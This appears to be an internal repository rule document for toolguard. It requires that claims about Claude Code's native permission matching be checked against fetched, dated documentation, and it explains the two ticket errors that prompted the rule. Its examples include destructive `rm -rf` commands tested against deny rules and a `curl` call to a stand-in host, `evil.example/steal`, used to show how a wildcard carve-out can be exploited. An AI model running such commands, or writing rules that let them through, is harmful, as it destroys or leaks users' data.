# Claims about Claude Code's native permission syntax must be fetched, not recalled

**Applies to**: any agent writing or reviewing code, comments, docs or tickets in this repo that assert what Claude Code's *own* permission matching does.

## The rule

**Before writing or approving any statement about native behaviour, fetch `https://code.claude.com/docs/en/permissions.md` and quote it.** Put the quote and the date in whatever artifact carries the claim. Do not restate native semantics from memory, from another agent's summary, or from this repository's code.

A blinded review **cannot** catch an error here. Reviewers check prose against *this repository's* code, and native's behaviour is not in this repository — so a false claim about it passes every check the gate performs. This is not a reviewer failing; it is outside what the gate can see.

## Why the rule exists — it has bitten twice, in one day, in one subject area

**Ticket 77 (2026-08-19).** The claim in circulation was that native *"strips assignments for allow rules only, leaving the deny bypass open."* The published doc says: *"A deny or ask rule matches past any leading assignment, so `Bash(rm *)` in deny still matches `FOO=bar rm -rf tmp/`."* Native had no bypass; toolguard did. Origin: a research subagent quoted one sentence and omitted the next. It then survived **two blinded review rounds**.

**Ticket 82 (2026-08-20).** A ticket asserted that `sudo rm -rf x` and `env rm -rf x` evading `deny Bash(rm:*)` were toolguard defects. The doc lists the stripped wrappers exactly — `timeout`, `time`, `nice`, `nohup`, `stdbuf`, `command`, `builtin`, `noglob`, and bare `xargs` — and `sudo` and `env` are **not among them**, so toolguard was faithful and the ticket's premise was wrong. The same investigation had also imported ticket 77's allow/deny asymmetry into a wrapper design note marked *"not to be re-derived"* — but that asymmetry is documented for **leading assignments** only, and native's wrapper example is itself an **allow** rule. Fetching the page found a real defect in the opposite direction: native strips those nine wrappers and toolguard strips none.

Both were caught by Arnon asking a question. Neither was caught by a review, a test, or a metric.

## `[native]` fidelity is a claim with a date on it, always

`[native]` is defined by reference to an **external, evolving specification**. Claude Code has already changed it — wildcards at any position and the word-boundary rule are recent, and Arnon's recollection that it once took only a trailing wildcard was correct *for an earlier version*. So toolguard's fidelity to native **cannot be established once**.

A sentence like *"mirrors Claude Code's native syntax"* is a universally quantified claim about a moving target. Prefer *"matches native as documented on <date>"*, and cite.

## Checklist

- [ ] Does this change assert anything about how native matches, strips, anchors, or scopes a rule?
- [ ] If yes, has `https://code.claude.com/docs/en/permissions.md` been fetched **in this session**?
- [ ] Is the supporting sentence quoted verbatim, with the sentences **around** it read? (Both failures above came from a quote that stopped one sentence early.)
- [ ] Does the artifact carry the date of the fetch?
- [ ] Is the claim scoped to that date rather than stated as permanent equivalence?

---

## WHY fidelity is load-bearing here — Arnon, 2026-08-20

> *"fidelity to native is important. Auto-migrate will keep introducing rules that claude wrote - they **must** mean exactly the same thing in toolguard."*

**This is a correctness property of the migration path, not a compatibility nicety.** `auto_migrate` and the migration tooling continuously import rules that Claude Code itself authored — written against native semantics, by a writer that has never heard of toolguard. **Any divergence silently changes what those rules mean the moment they cross the boundary.** The user is never told; the rule looks identical in the file.

That reframes every fidelity decision in this project:

- **A divergence that is "safer" is still a defect.** Measured instance, ticket 18: toolguard split a pattern at the *first* colon, so `Bash(curl http://localhost:*)` matched nothing. A `hard_deny` carve-out written that way was inert, and the surrounding deny held — **accidentally safer than native**. Becoming faithful made that documented recipe genuinely more permissive (it exempts `curl http://localhost http://evil.example/steal`, because native's `*` spans arguments). **Fidelity won anyway**, because a migrated rule must not mean one thing in Claude Code and another here.
- **So "we diverge, but in the safe direction" is not a defence.** If a native rule shape is too permissive, the fix is to document that and warn about it — not to quietly under-implement it.
- **The place to catch a dangerous-but-faithful rule is the security audit**, not the matcher. A carve-out whose trailing `*` can span arguments is worth flagging to the user; silently failing to match it is not.
